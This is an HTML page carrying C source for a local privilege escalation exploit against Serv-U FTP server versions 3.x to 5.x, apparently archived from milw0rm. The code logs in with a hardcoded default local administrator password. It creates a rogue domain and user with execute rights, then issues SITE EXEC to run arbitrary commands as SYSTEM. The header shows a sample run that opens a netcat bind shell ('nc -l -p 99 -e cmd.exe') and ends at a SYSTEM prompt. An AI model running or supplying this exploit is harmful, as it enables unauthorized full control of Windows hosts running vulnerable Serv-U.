<html><head><title>Serv-U 3x - 5.x Local Privilege Escalation Exploit</title></head><pre>/*
 * Hax0rcitos proudly presents
 * Serv-u Local Exploit &gt;v3.x. (tested also against last version 5.1.0.0)
 *
 * All Serv-u Versions have default Login/password for local Administration.
 * This account is only available to connect in the loopback interface, so a
 * local user will be able to connect to Serv-u with this account and create
 * an ftp user with execute rights. after the user is created, just connect
 * to the ftp server and execute a raw &quot;SITE EXEC&quot; command. the program will
 * be execute with SYSTEM privileges.
 *
 * Copyright (c) 2003-2004  Haxorcitos com . All Rights Reserved.
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
 * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 *
 * Date:   10/2003
 * Author: Andrés Tarascó Acunha
 *
 * Greetings to: #haxorcitos - #localhost and #!dsr blackxors =)
 *
 * Tested Against Serv-u 4.x and v5.1.0.0

         G:\exploit\serv-U\local&gt;whoami
        INSANE\aT4r

        G:\exploit\serv-U\local&gt;servulocal.exe &quot;nc -l -p 99 -e cmd.exe&quot;
        Serv-u &gt;3.x Local Exploit by Haxorcitos

        &lt;220 Serv-U FTP Server v5.0 for WinSock ready...
        &gt;USER LocalAdministrator
        &lt;331 User name okay, need password.
        ******************************************************
        &gt;PASS #l@$ak#.lk;0@P
        &lt;230 User logged in, proceed.
        ******************************************************
        &gt;SITE MAINTENANCE
        ******************************************************
        [+] Creating New Domain...
        &lt;200-DomainID=3
        220 Domain settings saved
        ******************************************************
        [+] Domain Haxorcitos:3 Created
        [+] Setting New Domain Online
        &lt;220 Server command OK
        ******************************************************
        [+] Creating Evil User
        &lt;200-User=haxorcitos
        200 User settings saved
        ******************************************************
        [+] Now Exploiting...
        &gt;USER haxorcitos
        &lt;331 User name okay, need password.
        ******************************************************
        &gt;PASS whitex0r
        &lt;230 User logged in, proceed.
        ******************************************************
        [+] Now Executing: nc -l -p 99 -e cmd.exe
        &lt;220 Domain deleted
        ******************************************************
         G:\exploit\serv-U\local&gt;nc localhost 99
        Microsoft Windows XP [Versión 5.1.2600]
        (C) Copyright 1985-2001 Microsoft Corp.

        C:\&gt;whoami
        whoami
        NT AUTHORITY\SYSTEM
         C:\&gt;
  */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;io.h&gt;
#include &lt;process.h&gt;

//Responses
#define BANNER                  &quot;220 &quot;
#define USEROK                  &quot;331 User name okay&quot;
#define PASSOK                  &quot;230 User logged in, proceed.&quot;
#define ADMOK                   &quot;230-Switching to SYSTEM MAINTENANCE mode.&quot;
#define DOMAINID                &quot;200-DomainID=&quot;
//Commands

#define XPLUSER                    &quot;USER haxorcitos\r\n&quot;
#define XPLPASSWORD                &quot;PASS whitex0r\r\n&quot;
#define USER                    &quot;USER LocalAdministrator\r\n&quot;
#define PASSWORD                &quot;PASS #l@$ak#.lk;0@P\r\n&quot;

#define MAINTENANCE             &quot;SITE MAINTENANCE\r\n&quot;
#define EXIT                    &quot;QUIT\r\n&quot;
char newdomain[]=&quot;-SETDOMAIN\r\n&quot;
                 &quot;-Domain=haxorcitos|0.0.0.0|2121|-1|1|0\r\n&quot;
		 &quot;-TZOEnable=0\r\n&quot;
		 &quot; TZOKey=\r\n&quot;;
/*               &quot;-DynDNSEnable=0\r\n&quot;
                 &quot; DynIPName=\r\n&quot;;
*/
char deldomain[]=&quot;-DELETEDOMAIN\r\n&quot;
                 &quot;-IP=0.0.0.0\r\n&quot;
                 &quot; PortNo=2121\r\n&quot;;

char newuser[] =
                &quot;-SETUSERSETUP\r\n&quot;
                &quot;-IP=0.0.0.0\r\n&quot;
                &quot;-PortNo=2121\r\n&quot;
                &quot;-User=haxorcitos\r\n&quot;
                &quot;-Password=whitex0r\r\n&quot;
                &quot;-HomeDir=c:\\\r\n&quot;
                &quot;-LoginMesFile=\r\n&quot;
                &quot;-Disable=0\r\n&quot;
                &quot;-RelPaths=1\r\n&quot;
                &quot;-NeedSecure=0\r\n&quot;
                &quot;-HideHidden=0\r\n&quot;
                &quot;-AlwaysAllowLogin=0\r\n&quot;
                &quot;-ChangePassword=0\r\n&quot;
                &quot;-QuotaEnable=0\r\n&quot;
                &quot;-MaxUsersLoginPerIP=-1\r\n&quot;
                &quot;-SpeedLimitUp=0\r\n&quot;
                &quot;-SpeedLimitDown=0\r\n&quot;
                &quot;-MaxNrUsers=-1\r\n&quot;
                &quot;-IdleTimeOut=600\r\n&quot;
                &quot;-SessionTimeOut=-1\r\n&quot;
                &quot;-Expire=0\r\n&quot;
                &quot;-RatioUp=1\r\n&quot;
                &quot;-RatioDown=1\r\n&quot;
                &quot;-RatiosCredit=0\r\n&quot;
                &quot;-QuotaCurrent=0\r\n&quot;
                &quot;-QuotaMaximum=0\r\n&quot;
                &quot;-Maintenance=None\r\n&quot;
                &quot;-PasswordType=Regular\r\n&quot;
                &quot;-Ratios=None\r\n&quot;
                &quot; Access=c:\\|RELP\r\n&quot;;

#define localport 43958
#define localip &quot;127.0.0.1&quot;

char cadena[1024];
int rec,domain;
/******************************************************************************/

void ParseCommands(int sock, char *data, int ShowSend, int showResponses,
char *response) {
 send(sock,data,strlen(data),0);
 if (ShowSend) printf(&quot;&gt;%s&quot;,data);
 Sleep(100);
 do {
         rec=recv(sock,cadena,sizeof(cadena),0); cadena[rec]='\0';
         if (rec&lt;=0) return;
         if (showResponses) printf(&quot;&lt;%s&quot;,cadena);
         if (strncmp(cadena, DOMAINID,strlen(DOMAINID))==0)
                domain=atoi(cadena+strlen(DOMAINID));
 //} while (strncmp(cadena,response,strlen(response))!=0);
 } while (strstr(cadena,response)==NULL);
  printf(&quot;******************************************************\r\n&quot;);
}
/******************************************************************************/
int main(int argc, char* argv[])
{
	WSADATA ws;
        int sock,sock2;

        struct sockaddr_in haxorcitos;
        struct sockaddr_in xpl;

printf(&quot;Serv-u &gt;3.x Local Exploit by Haxorcitos\r\n\r\n&quot;);
if (argc&lt;2) {
        printf(&quot;USAGE:   ServuLocal.exe \&quot;command\&quot;\r\n&quot;);
        printf(&quot;Example: ServuLocal.exe \&quot;nc.exe -l -p 99 -e cmd.exe\&quot;&quot;);
         return(0);
}

        if	(WSAStartup( MAKEWORD(2,2), &amp;ws )!=0) {
		printf(&quot; [-] WSAStartup() error\n&quot;);
		exit(0);
	}

	haxorcitos.sin_family = AF_INET;
	haxorcitos.sin_port = htons(localport);
	haxorcitos.sin_addr.s_addr = inet_addr(localip);
        sock=socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(sock,( struct sockaddr *)&amp;haxorcitos,sizeof(haxorcitos));
        rec=recv(sock,cadena,sizeof(cadena),0); cadena[rec]='\0';
        printf(&quot;&lt;%s&quot;,cadena);

        ParseCommands(sock,USER,1,1,USEROK);
        ParseCommands(sock,PASSWORD,1,1,PASSOK);
        ParseCommands(sock,MAINTENANCE,1,0,&quot;230 &quot;);

        printf(&quot;[+] Creating New Domain...\r\n&quot;);
        ParseCommands(sock,newdomain,0,1,BANNER);
        printf(&quot;[+] Domain Haxorcitos:%i Created\n&quot;,domain);

/* Only for v5.x
        printf(&quot;[+] Setting New Domain Online\r\n&quot;);
        sprintf(cadena,&quot;-SERVERCOMMAND\r\n-ID=%i\r\n
Command=DomainOnline\r\n&quot;,domain);
        ParseCommands(sock,cadena,0,1,BANNER);
*/
        printf(&quot;[+] Creating Evil User\r\n&quot;);
        ParseCommands(sock,newuser,0,1,&quot;200 &quot;);
        Sleep(1000);

        printf(&quot;[+] Now Exploiting...\r\n&quot;);
	xpl.sin_family = AF_INET;
	xpl.sin_port = htons(2121);
	xpl.sin_addr.s_addr = inet_addr(localip);
        sock2=socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(sock2,( struct sockaddr *)&amp;xpl,sizeof(xpl));
        rec=recv(sock2,cadena,sizeof(cadena),0); cadena[rec]='\0';
        ParseCommands(sock2,XPLUSER,1,1,USEROK);
        ParseCommands(sock2,XPLPASSWORD,1,1,PASSOK);
        printf(&quot;[+] Now Executing: %s\r\n&quot;,argv[1]);
        sprintf(cadena,&quot;site exec %s\r\n&quot;,argv[1]);
        send(sock2,cadena,strlen(cadena),0);
        shutdown(sock2,SD_BOTH);
        Sleep(100);
        ParseCommands(sock,deldomain,0,1,BANNER);
        send(sock,EXIT,strlen(EXIT),0);
        shutdown(sock,SD_BOTH);
        closesocket(sock);
        closesocket(sock2);

        return 0;
}

// milw0rm.com [2004-08-08]</pre></html>